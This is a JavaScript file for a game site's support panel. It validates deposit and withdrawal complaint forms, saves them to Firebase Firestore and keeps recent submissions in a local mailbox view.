/**
 * TOPX Game Support - User Panel
 * Firebase Firestore Integration + Form Handling + iOS Animations
 */

// ===== FIREBASE CONFIG =====
const FIREBASE_CONFIG = {
  apiKey: "AIzaSyCiqaLzh7PoVC5l03sJFdtK548Wulufn94",
  authDomain: "alll-projects-admin-pennal.firebaseapp.com",
  projectId: "alll-projects-admin-pennal",
  storageBucket: "alll-projects-admin-pennal.firebasestorage.app",
  messagingSenderId: "689297868215",
  appId: "1:689297868215:web:2747b19c2da47a31f49432"
};

const SITE_ID = "topx_game";

// ===== FIREBASE DYNAMIC LOADER =====
let _fbDb = null;
let _fbLoading = null;

function loadFirebase() {
  if (_fbDb) return Promise.resolve(_fbDb);
  if (_fbLoading) return _fbLoading;

  _fbLoading = new Promise((resolve, reject) => {
    const initDb = () => {
      try {
        if (!firebase.apps.length) firebase.initializeApp(FIREBASE_CONFIG);
        _fbDb = firebase.firestore();
        resolve(_fbDb);
      } catch (e) { reject(e); }
    };

    if (window.firebase && window.firebase.firestore) { initDb(); return; }

    const urls = [
      'https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js',
      'https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore-compat.js'
    ];
    let loaded = 0;
    urls.forEach(src => {
      const s = document.createElement('script');
      s.src = src;
      s.onload = () => {
        loaded++;
        if (loaded === urls.length) initDb();
      };
      s.onerror = () => reject(new Error('Firebase load failed: ' + src));
      document.head.appendChild(s);
    });
  });

  return _fbLoading;
}

function saveSubmission(data) {
  return loadFirebase().then(db => {
    const payload = { ...data, site_id: SITE_ID, created_at: firebase.firestore.FieldValue.serverTimestamp() };
    return db.collection('submissions').add(payload);
  });
}

// ===== FORM VALIDATION - ALL FIELDS REQUIRED =====
(function() {
  const s = document.createElement('style');
  s.textContent = '.submit-btn.btn-disabled{background:#FFB3B0!important;cursor:not-allowed!important;transform:none!important;box-shadow:none!important}';
  document.head.appendChild(s);
})();

function setupFormValidation(formEl) {
  const inputs = formEl.querySelectorAll('input[required]');
  const btn = formEl.querySelector('.submit-btn');

  function check() {
    let ok = true;
    inputs.forEach(i => { if (!i.value.trim()) ok = false; });
    btn.classList.toggle('btn-disabled', !ok);
  }

  inputs.forEach(i => i.addEventListener('input', check));
  check();
}

// ===== GLOBAL VARIABLES =====
let submissions = JSON.parse(localStorage.getItem('topx_submissions') || '[]');

// ===== DOM ELEMENTS =====
const tabBtns        = document.querySelectorAll('.tab-btn');
const formSections   = document.querySelectorAll('.form-section');
const depositForm    = document.getElementById('depositFormEl');
const withdrawalForm = document.getElementById('withdrawalFormEl');
const successPopup   = document.getElementById('successPopup');
const mailboxPopup   = document.getElementById('mailboxPopup');
const mailboxBtn     = document.getElementById('mailboxBtn');
const submissionsList = document.getElementById('submissionsList');

// ===== TAB SWITCHING =====
tabBtns.forEach(btn => {
  btn.addEventListener('click', () => {
    const tab = btn.dataset.tab;
    tabBtns.forEach(b => b.classList.remove('active'));
    btn.classList.add('active');
    formSections.forEach(section => section.classList.remove('active'));
    document.getElementById(`${tab}Form`).classList.add('active');
  });
});

// ===== FORM SUBMISSION =====
function setupFormSubmission(formEl, formType) {
  formEl.addEventListener('submit', async (e) => {
    e.preventDefault();

    const requiredInputs = formEl.querySelectorAll('input[required]');
    let allFilled = true;
    requiredInputs.forEach(i => { if (!i.value.trim()) allFilled = false; });
    if (!allFilled) {
      alert('पहले बाकी है fill section complete करो');
      return;
    }

    const submitBtn = formEl.querySelector('.submit-btn');
    const formData  = {};

    // Collect form data
    new FormData(formEl).forEach((value, key) => {
      formData[key] = value.trim();
    });

    // Add metadata
    formData.type      = formType === 'deposit' ? 'Deposit Problem' : 'Withdrawal Problem';
    formData.timestamp = new Date().toLocaleString('en-IN', {
      day: '2-digit', month: 'short', year: 'numeric',
      hour: '2-digit', minute: '2-digit'
    });
    formData.timestampMs = Date.now();

    // Validate
    if (formType === 'deposit' && !formData.utr) {
      alert('Please enter UTR number');
      return;
    }
    if (formType === 'withdrawal' && !formData.email) {
      alert('Email is required for withdrawal');
      return;
    }

    // Show loading
    submitBtn.classList.add('loading');
    submitBtn.disabled = true;

    try {
      // Save to Firebase
      await saveSubmission(formData);

      // Save to localStorage for mailbox
      submissions.push({
        ...formData,
        id: Date.now()
      });
      // Keep last 20 only
      if (submissions.length > 20) submissions = submissions.slice(-20);
      localStorage.setItem('topx_submissions', JSON.stringify(submissions));

      // Reset & show success
      submitBtn.classList.remove('loading');
      submitBtn.disabled = false;
      formEl.reset();
      showSuccessPopup();
      loadUserSubmissions();

    } catch (error) {
      console.error('Firebase error:', error);
      submitBtn.classList.remove('loading');
      submitBtn.disabled = false;
      alert('Submission failed. Please try again.');
    }
  });
}

// Initialize forms
setupFormSubmission(depositForm,    'deposit');
setupFormSubmission(withdrawalForm, 'withdrawal');

// Setup validation
setupFormValidation(depositForm);
setupFormValidation(withdrawalForm);

// ===== SUCCESS POPUP =====
function showSuccessPopup() {
  successPopup.classList.add('active');
  setTimeout(() => {
    successPopup.classList.remove('active');
  }, 5000);
}

document.getElementById('closePopup').addEventListener('click', () => {
  successPopup.classList.remove('active');
});

// ===== MAILBOX =====
mailboxBtn.addEventListener('click', () => {
  mailboxPopup.classList.add('active');
  loadUserSubmissions();
});

document.getElementById('closeMailbox').addEventListener('click', () => {
  mailboxPopup.classList.remove('active');
});

function loadUserSubmissions() {
  const localSubs = JSON.parse(localStorage.getItem('topx_submissions') || '[]');

  if (localSubs.length === 0) {
    submissionsList.innerHTML = '<p class="no-submissions">No submissions yet. Your requests will appear here.</p>';
    return;
  }

  let html = '';
  localSubs.slice(-5).reverse().forEach(sub => {
    html += `
      <div class="submission-item">
        <span class="label">${sub.type === 'Deposit Problem' ? '💰 Deposit' : '💸 Withdrawal'}</span>
        <span class="value">📧 ${sub.email  || 'N/A'}</span><br>
        <span class="value">📱 ${sub.mobile || 'N/A'}</span><br>
        <span class="value">💵 ₹${sub.amount || 'N/A'} ${sub.utr ? `| UTR: ${sub.utr}` : ''}</span><br>
        <span class="value" style="color:#8E8E93;font-size:12px;margin-top:5px;display:block">
          ${sub.timestamp}
        </span>
      </div>
    `;
  });

  submissionsList.innerHTML = html;
}

// ===== IOS TOUCH OPTIMIZATIONS =====
document.addEventListener('touchstart', function() {}, { passive: true });

document.querySelectorAll('input').forEach(input => {
  input.addEventListener('focus', function() {
    if (window.innerWidth < 1024) {
      document.querySelector('meta[name="viewport"]')
        .setAttribute('content', 'width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no');
    }
  });
  input.addEventListener('blur', function() {
    document.querySelector('meta[name="viewport"]')
      .setAttribute('content', 'width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no');
  });
});

console.log('✅ TOPX Support Panel Loaded | Firebase Active 🚀');

// Preload Firebase in background
loadFirebase().catch(e => console.warn('Firebase preload skipped:', e));
